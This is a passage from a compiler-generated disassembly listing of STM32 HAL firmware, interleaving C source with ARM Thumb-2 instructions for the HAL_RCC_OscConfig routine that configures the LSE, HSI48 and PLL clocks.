 8004010:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
 8004014:	4b96      	ldr	r3, [pc, #600]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004016:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800401a:	4a95      	ldr	r2, [pc, #596]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800401c:	f023 0304 	bic.w	r3, r3, #4
 8004020:	f8c2 3090 	str.w	r3, [r2, #144]	; 0x90
#endif /* RCC_BDCR_LSESYSDIS */

    /* Check the LSE State */
    if(RCC_OscInitStruct->LSEState != RCC_LSE_OFF)
 8004024:	687b      	ldr	r3, [r7, #4]
 8004026:	689b      	ldr	r3, [r3, #8]
 8004028:	2b00      	cmp	r3, #0
 800402a:	d016      	beq.n	800405a <HAL_RCC_OscConfig+0x562>
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 800402c:	f7fd f9e0 	bl	80013f0 <HAL_GetTick>
 8004030:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is ready */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 8004032:	e00a      	b.n	800404a <HAL_RCC_OscConfig+0x552>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004034:	f7fd f9dc 	bl	80013f0 <HAL_GetTick>
 8004038:	4602      	mov	r2, r0
 800403a:	693b      	ldr	r3, [r7, #16]
 800403c:	1ad3      	subs	r3, r2, r3
 800403e:	f241 3288 	movw	r2, #5000	; 0x1388
 8004042:	4293      	cmp	r3, r2
 8004044:	d901      	bls.n	800404a <HAL_RCC_OscConfig+0x552>
        {
          return HAL_TIMEOUT;
 8004046:	2303      	movs	r3, #3
 8004048:	e162      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) == 0U)
 800404a:	4b89      	ldr	r3, [pc, #548]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800404c:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 8004050:	f003 0302 	and.w	r3, r3, #2
 8004054:	2b00      	cmp	r3, #0
 8004056:	d0ed      	beq.n	8004034 <HAL_RCC_OscConfig+0x53c>
 8004058:	e015      	b.n	8004086 <HAL_RCC_OscConfig+0x58e>
      }
    }
    else
    {
      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 800405a:	f7fd f9c9 	bl	80013f0 <HAL_GetTick>
 800405e:	6138      	str	r0, [r7, #16]

      /* Wait till LSE is disabled */
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8004060:	e00a      	b.n	8004078 <HAL_RCC_OscConfig+0x580>
      {
        if((HAL_GetTick() - tickstart) > RCC_LSE_TIMEOUT_VALUE)
 8004062:	f7fd f9c5 	bl	80013f0 <HAL_GetTick>
 8004066:	4602      	mov	r2, r0
 8004068:	693b      	ldr	r3, [r7, #16]
 800406a:	1ad3      	subs	r3, r2, r3
 800406c:	f241 3288 	movw	r2, #5000	; 0x1388
 8004070:	4293      	cmp	r3, r2
 8004072:	d901      	bls.n	8004078 <HAL_RCC_OscConfig+0x580>
        {
          return HAL_TIMEOUT;
 8004074:	2303      	movs	r3, #3
 8004076:	e14b      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->BDCR, RCC_BDCR_LSERDY) != 0U)
 8004078:	4b7d      	ldr	r3, [pc, #500]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800407a:	f8d3 3090 	ldr.w	r3, [r3, #144]	; 0x90
 800407e:	f003 0302 	and.w	r3, r3, #2
 8004082:	2b00      	cmp	r3, #0
 8004084:	d1ed      	bne.n	8004062 <HAL_RCC_OscConfig+0x56a>
      CLEAR_BIT(RCC->BDCR, RCC_BDCR_LSESYSDIS);
#endif /* RCC_BDCR_LSESYSDIS */
    }

    /* Restore clock configuration if changed */
    if(pwrclkchanged == SET)
 8004086:	7ffb      	ldrb	r3, [r7, #31]
 8004088:	2b01      	cmp	r3, #1
 800408a:	d105      	bne.n	8004098 <HAL_RCC_OscConfig+0x5a0>
    {
      __HAL_RCC_PWR_CLK_DISABLE();
 800408c:	4b78      	ldr	r3, [pc, #480]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800408e:	6d9b      	ldr	r3, [r3, #88]	; 0x58
 8004090:	4a77      	ldr	r2, [pc, #476]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004092:	f023 5380 	bic.w	r3, r3, #268435456	; 0x10000000
 8004096:	6593      	str	r3, [r2, #88]	; 0x58
    }
  }
#if defined(RCC_HSI48_SUPPORT)
  /*------------------------------ HSI48 Configuration -----------------------*/
  if(((RCC_OscInitStruct->OscillatorType) & RCC_OSCILLATORTYPE_HSI48) == RCC_OSCILLATORTYPE_HSI48)
 8004098:	687b      	ldr	r3, [r7, #4]
 800409a:	681b      	ldr	r3, [r3, #0]
 800409c:	f003 0320 	and.w	r3, r3, #32
 80040a0:	2b00      	cmp	r3, #0
 80040a2:	d03c      	beq.n	800411e <HAL_RCC_OscConfig+0x626>
  {
    /* Check the parameters */
    assert_param(IS_RCC_HSI48(RCC_OscInitStruct->HSI48State));

    /* Check the LSI State */
    if(RCC_OscInitStruct->HSI48State != RCC_HSI48_OFF)
 80040a4:	687b      	ldr	r3, [r7, #4]
 80040a6:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 80040a8:	2b00      	cmp	r3, #0
 80040aa:	d01c      	beq.n	80040e6 <HAL_RCC_OscConfig+0x5ee>
    {
      /* Enable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_ENABLE();
 80040ac:	4b70      	ldr	r3, [pc, #448]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80040ae:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 80040b2:	4a6f      	ldr	r2, [pc, #444]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80040b4:	f043 0301 	orr.w	r3, r3, #1
 80040b8:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 80040bc:	f7fd f998 	bl	80013f0 <HAL_GetTick>
 80040c0:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is ready */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 80040c2:	e008      	b.n	80040d6 <HAL_RCC_OscConfig+0x5de>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 80040c4:	f7fd f994 	bl	80013f0 <HAL_GetTick>
 80040c8:	4602      	mov	r2, r0
 80040ca:	693b      	ldr	r3, [r7, #16]
 80040cc:	1ad3      	subs	r3, r2, r3
 80040ce:	2b02      	cmp	r3, #2
 80040d0:	d901      	bls.n	80040d6 <HAL_RCC_OscConfig+0x5de>
        {
          return HAL_TIMEOUT;
 80040d2:	2303      	movs	r3, #3
 80040d4:	e11c      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) == 0U)
 80040d6:	4b66      	ldr	r3, [pc, #408]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80040d8:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 80040dc:	f003 0302 	and.w	r3, r3, #2
 80040e0:	2b00      	cmp	r3, #0
 80040e2:	d0ef      	beq.n	80040c4 <HAL_RCC_OscConfig+0x5cc>
 80040e4:	e01b      	b.n	800411e <HAL_RCC_OscConfig+0x626>
      }
    }
    else
    {
      /* Disable the Internal Low Speed oscillator (HSI48). */
      __HAL_RCC_HSI48_DISABLE();
 80040e6:	4b62      	ldr	r3, [pc, #392]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80040e8:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 80040ec:	4a60      	ldr	r2, [pc, #384]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80040ee:	f023 0301 	bic.w	r3, r3, #1
 80040f2:	f8c2 3098 	str.w	r3, [r2, #152]	; 0x98

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 80040f6:	f7fd f97b 	bl	80013f0 <HAL_GetTick>
 80040fa:	6138      	str	r0, [r7, #16]

      /* Wait till HSI48 is disabled */
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 80040fc:	e008      	b.n	8004110 <HAL_RCC_OscConfig+0x618>
      {
        if((HAL_GetTick() - tickstart) > HSI48_TIMEOUT_VALUE)
 80040fe:	f7fd f977 	bl	80013f0 <HAL_GetTick>
 8004102:	4602      	mov	r2, r0
 8004104:	693b      	ldr	r3, [r7, #16]
 8004106:	1ad3      	subs	r3, r2, r3
 8004108:	2b02      	cmp	r3, #2
 800410a:	d901      	bls.n	8004110 <HAL_RCC_OscConfig+0x618>
        {
          return HAL_TIMEOUT;
 800410c:	2303      	movs	r3, #3
 800410e:	e0ff      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
      while(READ_BIT(RCC->CRRCR, RCC_CRRCR_HSI48RDY) != 0U)
 8004110:	4b57      	ldr	r3, [pc, #348]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004112:	f8d3 3098 	ldr.w	r3, [r3, #152]	; 0x98
 8004116:	f003 0302 	and.w	r3, r3, #2
 800411a:	2b00      	cmp	r3, #0
 800411c:	d1ef      	bne.n	80040fe <HAL_RCC_OscConfig+0x606>
#endif /* RCC_HSI48_SUPPORT */
  /*-------------------------------- PLL Configuration -----------------------*/
  /* Check the parameters */
  assert_param(IS_RCC_PLL(RCC_OscInitStruct->PLL.PLLState));

  if(RCC_OscInitStruct->PLL.PLLState != RCC_PLL_NONE)
 800411e:	687b      	ldr	r3, [r7, #4]
 8004120:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 8004122:	2b00      	cmp	r3, #0
 8004124:	f000 80f3 	beq.w	800430e <HAL_RCC_OscConfig+0x816>
  {
    /* PLL On ? */
    if(RCC_OscInitStruct->PLL.PLLState == RCC_PLL_ON)
 8004128:	687b      	ldr	r3, [r7, #4]
 800412a:	6a9b      	ldr	r3, [r3, #40]	; 0x28
 800412c:	2b02      	cmp	r3, #2
 800412e:	f040 80c9 	bne.w	80042c4 <HAL_RCC_OscConfig+0x7cc>
#endif /* RCC_PLLP_SUPPORT */
      assert_param(IS_RCC_PLLQ_VALUE(RCC_OscInitStruct->PLL.PLLQ));
      assert_param(IS_RCC_PLLR_VALUE(RCC_OscInitStruct->PLL.PLLR));

      /* Do nothing if PLL configuration is the unchanged */
      pll_config = RCC->PLLCFGR;
 8004132:	4b4f      	ldr	r3, [pc, #316]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004134:	68db      	ldr	r3, [r3, #12]
 8004136:	617b      	str	r3, [r7, #20]
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8004138:	697b      	ldr	r3, [r7, #20]
 800413a:	f003 0203 	and.w	r2, r3, #3
 800413e:	687b      	ldr	r3, [r7, #4]
 8004140:	6adb      	ldr	r3, [r3, #44]	; 0x2c
 8004142:	429a      	cmp	r2, r3
 8004144:	d12c      	bne.n	80041a0 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8004146:	697b      	ldr	r3, [r7, #20]
 8004148:	f003 0270 	and.w	r2, r3, #112	; 0x70
 800414c:	687b      	ldr	r3, [r7, #4]
 800414e:	6b1b      	ldr	r3, [r3, #48]	; 0x30
 8004150:	3b01      	subs	r3, #1
 8004152:	011b      	lsls	r3, r3, #4
      if((READ_BIT(pll_config, RCC_PLLCFGR_PLLSRC)  != RCC_OscInitStruct->PLL.PLLSource) ||
 8004154:	429a      	cmp	r2, r3
 8004156:	d123      	bne.n	80041a0 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8004158:	697b      	ldr	r3, [r7, #20]
 800415a:	f403 42fe 	and.w	r2, r3, #32512	; 0x7f00
 800415e:	687b      	ldr	r3, [r7, #4]
 8004160:	6b5b      	ldr	r3, [r3, #52]	; 0x34
 8004162:	021b      	lsls	r3, r3, #8
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLM)    != ((RCC_OscInitStruct->PLL.PLLM - 1U) << RCC_PLLCFGR_PLLM_Pos)) ||
 8004164:	429a      	cmp	r2, r3
 8004166:	d11b      	bne.n	80041a0 <HAL_RCC_OscConfig+0x6a8>
#if defined(RCC_PLLP_SUPPORT)
#if defined(RCC_PLLP_DIV_2_31_SUPPORT)
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8004168:	697b      	ldr	r3, [r7, #20]
 800416a:	f003 4278 	and.w	r2, r3, #4160749568	; 0xf8000000
 800416e:	687b      	ldr	r3, [r7, #4]
 8004170:	6b9b      	ldr	r3, [r3, #56]	; 0x38
 8004172:	06db      	lsls	r3, r3, #27
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLN)    != (RCC_OscInitStruct->PLL.PLLN << RCC_PLLCFGR_PLLN_Pos)) ||
 8004174:	429a      	cmp	r2, r3
 8004176:	d113      	bne.n	80041a0 <HAL_RCC_OscConfig+0x6a8>
#else
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLP)    != ((RCC_OscInitStruct->PLL.PLLP == RCC_PLLP_DIV7) ? 0U : 1U)) ||
#endif
#endif
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 8004178:	697b      	ldr	r3, [r7, #20]
 800417a:	f403 02c0 	and.w	r2, r3, #6291456	; 0x600000
 800417e:	687b      	ldr	r3, [r7, #4]
 8004180:	6bdb      	ldr	r3, [r3, #60]	; 0x3c
 8004182:	085b      	lsrs	r3, r3, #1
 8004184:	3b01      	subs	r3, #1
 8004186:	055b      	lsls	r3, r3, #21
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLPDIV) != (RCC_OscInitStruct->PLL.PLLP << RCC_PLLCFGR_PLLPDIV_Pos)) ||
 8004188:	429a      	cmp	r2, r3
 800418a:	d109      	bne.n	80041a0 <HAL_RCC_OscConfig+0x6a8>
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLR)    != ((((RCC_OscInitStruct->PLL.PLLR) >> 1U) - 1U) << RCC_PLLCFGR_PLLR_Pos)))
 800418c:	697b      	ldr	r3, [r7, #20]
 800418e:	f003 62c0 	and.w	r2, r3, #100663296	; 0x6000000
 8004192:	687b      	ldr	r3, [r7, #4]
 8004194:	6c1b      	ldr	r3, [r3, #64]	; 0x40
 8004196:	085b      	lsrs	r3, r3, #1
 8004198:	3b01      	subs	r3, #1
 800419a:	065b      	lsls	r3, r3, #25
         (READ_BIT(pll_config, RCC_PLLCFGR_PLLQ)    != ((((RCC_OscInitStruct->PLL.PLLQ) >> 1U) - 1U) << RCC_PLLCFGR_PLLQ_Pos)) ||
 800419c:	429a      	cmp	r2, r3
 800419e:	d06b      	beq.n	8004278 <HAL_RCC_OscConfig+0x780>
      {
        /* Check if the PLL is used as system clock or not */
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 80041a0:	69bb      	ldr	r3, [r7, #24]
 80041a2:	2b0c      	cmp	r3, #12
 80041a4:	d062      	beq.n	800426c <HAL_RCC_OscConfig+0x774>
        {
#if defined(RCC_PLLSAI1_SUPPORT) || defined(RCC_PLLSAI2_SUPPORT)
          /* Check if main PLL can be updated */
          /* Not possible if the source is shared by other enabled PLLSAIx */
          if((READ_BIT(RCC->CR, RCC_CR_PLLSAI1ON) != 0U)
 80041a6:	4b32      	ldr	r3, [pc, #200]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80041a8:	681b      	ldr	r3, [r3, #0]
 80041aa:	f003 6380 	and.w	r3, r3, #67108864	; 0x4000000
 80041ae:	2b00      	cmp	r3, #0
 80041b0:	d001      	beq.n	80041b6 <HAL_RCC_OscConfig+0x6be>
#if defined(RCC_PLLSAI2_SUPPORT)
             || (READ_BIT(RCC->CR, RCC_CR_PLLSAI2ON) != 0U)
#endif
            )
          {
            return HAL_ERROR;
 80041b2:	2301      	movs	r3, #1
 80041b4:	e0ac      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
          }
          else
#endif /* RCC_PLLSAI1_SUPPORT || RCC_PLLSAI2_SUPPORT */
          {
            /* Disable the main PLL. */
            __HAL_RCC_PLL_DISABLE();
 80041b6:	4b2e      	ldr	r3, [pc, #184]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80041b8:	681b      	ldr	r3, [r3, #0]
 80041ba:	4a2d      	ldr	r2, [pc, #180]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80041bc:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 80041c0:	6013      	str	r3, [r2, #0]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 80041c2:	f7fd f915 	bl	80013f0 <HAL_GetTick>
 80041c6:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80041c8:	e008      	b.n	80041dc <HAL_RCC_OscConfig+0x6e4>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80041ca:	f7fd f911 	bl	80013f0 <HAL_GetTick>
 80041ce:	4602      	mov	r2, r0
 80041d0:	693b      	ldr	r3, [r7, #16]
 80041d2:	1ad3      	subs	r3, r2, r3
 80041d4:	2b02      	cmp	r3, #2
 80041d6:	d901      	bls.n	80041dc <HAL_RCC_OscConfig+0x6e4>
              {
                return HAL_TIMEOUT;
 80041d8:	2303      	movs	r3, #3
 80041da:	e099      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80041dc:	4b24      	ldr	r3, [pc, #144]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80041de:	681b      	ldr	r3, [r3, #0]
 80041e0:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80041e4:	2b00      	cmp	r3, #0
 80041e6:	d1f0      	bne.n	80041ca <HAL_RCC_OscConfig+0x6d2>
              }
            }

            /* Configure the main PLL clock source, multiplication and division factors. */
#if defined(RCC_PLLP_SUPPORT)
            __HAL_RCC_PLL_CONFIG(RCC_OscInitStruct->PLL.PLLSource,
 80041e8:	4b21      	ldr	r3, [pc, #132]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 80041ea:	68da      	ldr	r2, [r3, #12]
 80041ec:	4b21      	ldr	r3, [pc, #132]	; (8004274 <HAL_RCC_OscConfig+0x77c>)
 80041ee:	4013      	ands	r3, r2
 80041f0:	687a      	ldr	r2, [r7, #4]
 80041f2:	6ad1      	ldr	r1, [r2, #44]	; 0x2c
 80041f4:	687a      	ldr	r2, [r7, #4]
 80041f6:	6b12      	ldr	r2, [r2, #48]	; 0x30
 80041f8:	3a01      	subs	r2, #1
 80041fa:	0112      	lsls	r2, r2, #4
 80041fc:	4311      	orrs	r1, r2
 80041fe:	687a      	ldr	r2, [r7, #4]
 8004200:	6b52      	ldr	r2, [r2, #52]	; 0x34
 8004202:	0212      	lsls	r2, r2, #8
 8004204:	4311      	orrs	r1, r2
 8004206:	687a      	ldr	r2, [r7, #4]
 8004208:	6bd2      	ldr	r2, [r2, #60]	; 0x3c
 800420a:	0852      	lsrs	r2, r2, #1
 800420c:	3a01      	subs	r2, #1
 800420e:	0552      	lsls	r2, r2, #21
 8004210:	4311      	orrs	r1, r2
 8004212:	687a      	ldr	r2, [r7, #4]
 8004214:	6c12      	ldr	r2, [r2, #64]	; 0x40
 8004216:	0852      	lsrs	r2, r2, #1
 8004218:	3a01      	subs	r2, #1
 800421a:	0652      	lsls	r2, r2, #25
 800421c:	4311      	orrs	r1, r2
 800421e:	687a      	ldr	r2, [r7, #4]
 8004220:	6b92      	ldr	r2, [r2, #56]	; 0x38
 8004222:	06d2      	lsls	r2, r2, #27
 8004224:	430a      	orrs	r2, r1
 8004226:	4912      	ldr	r1, [pc, #72]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004228:	4313      	orrs	r3, r2
 800422a:	60cb      	str	r3, [r1, #12]
                                 RCC_OscInitStruct->PLL.PLLQ,
                                 RCC_OscInitStruct->PLL.PLLR);
#endif

            /* Enable the main PLL. */
            __HAL_RCC_PLL_ENABLE();
 800422c:	4b10      	ldr	r3, [pc, #64]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800422e:	681b      	ldr	r3, [r3, #0]
 8004230:	4a0f      	ldr	r2, [pc, #60]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004232:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004236:	6013      	str	r3, [r2, #0]

            /* Enable PLL System Clock output. */
            __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004238:	4b0d      	ldr	r3, [pc, #52]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800423a:	68db      	ldr	r3, [r3, #12]
 800423c:	4a0c      	ldr	r2, [pc, #48]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 800423e:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 8004242:	60d3      	str	r3, [r2, #12]

            /* Get Start Tick*/
            tickstart = HAL_GetTick();
 8004244:	f7fd f8d4 	bl	80013f0 <HAL_GetTick>
 8004248:	6138      	str	r0, [r7, #16]

            /* Wait till PLL is ready */
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800424a:	e008      	b.n	800425e <HAL_RCC_OscConfig+0x766>
            {
              if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 800424c:	f7fd f8d0 	bl	80013f0 <HAL_GetTick>
 8004250:	4602      	mov	r2, r0
 8004252:	693b      	ldr	r3, [r7, #16]
 8004254:	1ad3      	subs	r3, r2, r3
 8004256:	2b02      	cmp	r3, #2
 8004258:	d901      	bls.n	800425e <HAL_RCC_OscConfig+0x766>
              {
                return HAL_TIMEOUT;
 800425a:	2303      	movs	r3, #3
 800425c:	e058      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
            while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 800425e:	4b04      	ldr	r3, [pc, #16]	; (8004270 <HAL_RCC_OscConfig+0x778>)
 8004260:	681b      	ldr	r3, [r3, #0]
 8004262:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004266:	2b00      	cmp	r3, #0
 8004268:	d0f0      	beq.n	800424c <HAL_RCC_OscConfig+0x754>
        if(sysclk_source != RCC_CFGR_SWS_PLL)
 800426a:	e050      	b.n	800430e <HAL_RCC_OscConfig+0x816>
          }
        }
        else
        {
          /* PLL is already used as System core clock */
          return HAL_ERROR;
 800426c:	2301      	movs	r3, #1
 800426e:	e04f      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
 8004270:	40021000 	.word	0x40021000
 8004274:	019d808c 	.word	0x019d808c
      }
      else
      {
        /* PLL configuration is unchanged */
        /* Re-enable PLL if it was disabled (ie. low power mode) */
        if(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 8004278:	4b27      	ldr	r3, [pc, #156]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 800427a:	681b      	ldr	r3, [r3, #0]
 800427c:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 8004280:	2b00      	cmp	r3, #0
 8004282:	d144      	bne.n	800430e <HAL_RCC_OscConfig+0x816>
        {
          /* Enable the main PLL. */
          __HAL_RCC_PLL_ENABLE();
 8004284:	4b24      	ldr	r3, [pc, #144]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 8004286:	681b      	ldr	r3, [r3, #0]
 8004288:	4a23      	ldr	r2, [pc, #140]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 800428a:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800428e:	6013      	str	r3, [r2, #0]

          /* Enable PLL System Clock output. */
          __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_SYSCLK);
 8004290:	4b21      	ldr	r3, [pc, #132]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 8004292:	68db      	ldr	r3, [r3, #12]
 8004294:	4a20      	ldr	r2, [pc, #128]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 8004296:	f043 7380 	orr.w	r3, r3, #16777216	; 0x1000000
 800429a:	60d3      	str	r3, [r2, #12]

          /* Get Start Tick*/
          tickstart = HAL_GetTick();
 800429c:	f7fd f8a8 	bl	80013f0 <HAL_GetTick>
 80042a0:	6138      	str	r0, [r7, #16]

          /* Wait till PLL is ready */
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042a2:	e008      	b.n	80042b6 <HAL_RCC_OscConfig+0x7be>
          {
            if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80042a4:	f7fd f8a4 	bl	80013f0 <HAL_GetTick>
 80042a8:	4602      	mov	r2, r0
 80042aa:	693b      	ldr	r3, [r7, #16]
 80042ac:	1ad3      	subs	r3, r2, r3
 80042ae:	2b02      	cmp	r3, #2
 80042b0:	d901      	bls.n	80042b6 <HAL_RCC_OscConfig+0x7be>
            {
              return HAL_TIMEOUT;
 80042b2:	2303      	movs	r3, #3
 80042b4:	e02c      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
          while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) == 0U)
 80042b6:	4b18      	ldr	r3, [pc, #96]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 80042b8:	681b      	ldr	r3, [r3, #0]
 80042ba:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80042be:	2b00      	cmp	r3, #0
 80042c0:	d0f0      	beq.n	80042a4 <HAL_RCC_OscConfig+0x7ac>
 80042c2:	e024      	b.n	800430e <HAL_RCC_OscConfig+0x816>
      }
    }
    else
    {
      /* Check that PLL is not used as system clock or not */
      if(sysclk_source != RCC_CFGR_SWS_PLL)
 80042c4:	69bb      	ldr	r3, [r7, #24]
 80042c6:	2b0c      	cmp	r3, #12
 80042c8:	d01f      	beq.n	800430a <HAL_RCC_OscConfig+0x812>
      {
        /* Disable the main PLL. */
        __HAL_RCC_PLL_DISABLE();
 80042ca:	4b13      	ldr	r3, [pc, #76]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 80042cc:	681b      	ldr	r3, [r3, #0]
 80042ce:	4a12      	ldr	r2, [pc, #72]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 80042d0:	f023 7380 	bic.w	r3, r3, #16777216	; 0x1000000
 80042d4:	6013      	str	r3, [r2, #0]

        /* Get Start Tick*/
        tickstart = HAL_GetTick();
 80042d6:	f7fd f88b 	bl	80013f0 <HAL_GetTick>
 80042da:	6138      	str	r0, [r7, #16]

        /* Wait till PLL is disabled */
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80042dc:	e008      	b.n	80042f0 <HAL_RCC_OscConfig+0x7f8>
        {
          if((HAL_GetTick() - tickstart) > PLL_TIMEOUT_VALUE)
 80042de:	f7fd f887 	bl	80013f0 <HAL_GetTick>
 80042e2:	4602      	mov	r2, r0
 80042e4:	693b      	ldr	r3, [r7, #16]
 80042e6:	1ad3      	subs	r3, r2, r3
 80042e8:	2b02      	cmp	r3, #2
 80042ea:	d901      	bls.n	80042f0 <HAL_RCC_OscConfig+0x7f8>
          {
            return HAL_TIMEOUT;
 80042ec:	2303      	movs	r3, #3
 80042ee:	e00f      	b.n	8004310 <HAL_RCC_OscConfig+0x818>
        while(READ_BIT(RCC->CR, RCC_CR_PLLRDY) != 0U)
 80042f0:	4b09      	ldr	r3, [pc, #36]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 80042f2:	681b      	ldr	r3, [r3, #0]
 80042f4:	f003 7300 	and.w	r3, r3, #33554432	; 0x2000000
 80042f8:	2b00      	cmp	r3, #0
 80042fa:	d1f0      	bne.n	80042de <HAL_RCC_OscConfig+0x7e6>
        }
        /* Unselect main PLL clock source and disable main PLL outputs to save power */
#if defined(RCC_PLLSAI2_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI3CLK);
#elif defined(RCC_PLLSAI1_SUPPORT)
        RCC->PLLCFGR &= ~(RCC_PLLCFGR_PLLSRC | RCC_PLL_SYSCLK | RCC_PLL_48M1CLK | RCC_PLL_SAI2CLK);
 80042fc:	4b06      	ldr	r3, [pc, #24]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 80042fe:	68da      	ldr	r2, [r3, #12]
 8004300:	4905      	ldr	r1, [pc, #20]	; (8004318 <HAL_RCC_OscConfig+0x820>)
 8004302:	4b06      	ldr	r3, [pc, #24]	; (800431c <HAL_RCC_OscConfig+0x824>)
 8004304:	4013      	ands	r3, r2
 8004306:	60cb      	str	r3, [r1, #12]
 8004308:	e001      	b.n	800430e <HAL_RCC_OscConfig+0x816>
#endif /* RCC_PLLSAI2_SUPPORT */
      }
      else
      {
        /* PLL is already used as System core clock */
        return HAL_ERROR;
 800430a:	2301      	movs	r3, #1
